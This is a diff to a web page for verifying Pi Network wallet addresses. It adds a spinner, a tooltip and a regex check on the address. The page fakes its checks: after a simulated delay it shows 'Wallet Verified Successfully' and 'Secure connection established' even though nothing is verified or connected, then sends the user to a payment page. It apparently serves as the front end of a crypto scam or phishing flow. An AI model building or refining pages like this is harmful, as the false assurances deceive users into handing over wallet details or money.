@@ -6,7 +6,7 @@
     <title>Wallet Verification</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* Match previous design exactly */
+       /* Match previous design exactly */
         * {
             margin: 0;
             padding: 0;
@@ -95,7 +95,7 @@
             margin: 20px 0;
             align-items: center;
             gap: 10px;
-            animation: fadeIn 0.3s ease;
+            animation: fadeIn 0.5s ease;
         }
 
         /* CTA Button - Match previous design */
@@ -138,9 +138,40 @@
             transform: translateY(0);
         }
 
+        /* Loading Spinner */
+        .loading-spinner {
+            display: none;
+            font-size: 24px;
+            color: #713d92;
+            margin: 20px 0;
+        }
+
+        /* Tooltip */
+        .help-icon {
+            position: absolute;
+            right: 60px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #713d92;
+        }
+
+        .tooltip {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            background: #713d92;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+
         @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
@@ -163,20 +194,30 @@
             <input 
                 type="text" 
                 class="wallet-input" 
-                placeholder="Enter your wallet address"
+                placeholder="Enter your Pi wallet address"
                 id="walletAddress"
             >
+            <i class="fas fa-question-circle help-icon" id="helpIcon"></i>
+            <div class="tooltip" id="tooltip">Where can I find my Pi wallet address?</div>
         </div>
 
+        <!-- Loading Spinner -->
+        <div class="loading-spinner" id="loadingSpinner">
+            <i class="fas fa-spinner fa-spin"></i>
+        </div>
+
+        <!-- Verification Message -->
         <div class="verification-message" id="verificationMessage">
             <i class="fas fa-check-circle"></i>
             Wallet Verified Successfully
         </div>
 
+        <!-- Activate Button -->
         <button class="cta-button" id="activateButton" onclick="window.location.href='payment.html'">
-            Activate Payment
+            Activate Exchange
         </button>
 
+        <!-- Response Text -->
         <div class="response-text" id="responseText">
             <p>✅ Your wallet is now connected and verified</p>
             <p>🔒 Secure connection established</p>
@@ -189,16 +230,46 @@
         const verificationMessage = document.getElementById('verificationMessage');
         const activateButton = document.getElementById('activateButton');
         const responseText = document.getElementById('responseText');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const helpIcon = document.getElementById('helpIcon');
+        const tooltip = document.getElementById('tooltip');
 
+        // Wallet Address Validation for Pi Network
         walletInput.addEventListener('input', (e) => {
-            if (e.target.value.length > 10) {
-                // Simulate verification
+            const address = e.target.value.trim();
+            if (address.length > 0) {
+                loadingSpinner.style.display = 'block';
                 setTimeout(() => {
-                    verificationMessage.style.display = 'flex';
-                    activateButton.classList.add('show');
-                    responseText.classList.add('show');
-                }, 1500); // 1.5s verification delay
+                    loadingSpinner.style.display = 'none';
+                    if (isValidPiWalletAddress(address)) {
+                        verificationMessage.style.display = 'flex';
+                        verificationMessage.innerHTML = `<i class="fas fa-check-circle"></i> Wallet Verified Successfully`;
+                        verificationMessage.style.backgroundColor = '#f0e6ff';
+                        activateButton.classList.add('show');
+                        responseText.classList.add('show');
+                    } else {
+                        verificationMessage.style.display = 'flex';
+                        verificationMessage.innerHTML = `<i class="fas fa-times-circle"></i> Invalid Pi Wallet Address`;
+                        verificationMessage.style.backgroundColor = '#ffe6e6';
+                        activateButton.classList.remove('show');
+                        responseText.classList.remove('show');
+                    }
+                }, 1500); // Simulate verification delay
             }
+        });
+
+        // Validate Pi Network Wallet Address
+        function isValidPiWalletAddress(address) {
+            // Pi wallet addresses start with 'G' and contain alphanumeric characters
+            return /^G[a-zA-Z0-9]{55}$/.test(address);
+        }
+
+        // Tooltip for Help Icon
+        helpIcon.addEventListener('click', () => {
+            tooltip.style.display = 'block';
+            setTimeout(() => {
+                tooltip.style.display = 'none';
+            }, 3000); // Hide tooltip after 3 seconds
         });
     </script>
 </body>
